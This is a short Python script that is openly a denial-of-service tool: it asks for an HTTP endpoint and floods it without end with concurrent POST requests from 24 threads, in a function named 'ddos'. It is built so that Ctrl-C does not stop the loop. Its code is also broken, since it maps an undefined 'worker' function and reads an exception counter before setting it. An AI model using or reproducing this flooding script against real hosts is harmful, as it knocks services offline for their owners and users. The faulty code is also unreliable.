input("this one might be worse than the other script, press ctrl C now before its too late")


import requests
from concurrent.futures import ThreadPoolExecutor
data = 'hi'
endpoint = input('Enter http endpoint')
if not endpoint.startswith('http'):
    endpoint = 'http://' + endpoint
try:
    requests.post(endpoint, data=data)
except:
    endpoint = 'http://127.0.0.1:80'
def ddos(one, two):
    requests.post(one, data=two)

while 1:
    try:
        with ThreadPoolExecutor(max_workers=24) as executor:
            urls = [endpoint] * 24
            payloads = [data] * 24

            executor.map(worker, urls, payloads)
        exceptions = 0
    except KeyboardInterrupt:
        print("no")
        continue
    except Exception as e:
        exceptions+=1
        print(f'Error: {e}')
        continue
    if exceptions >= 5:
        break
print("Too many exceptions")
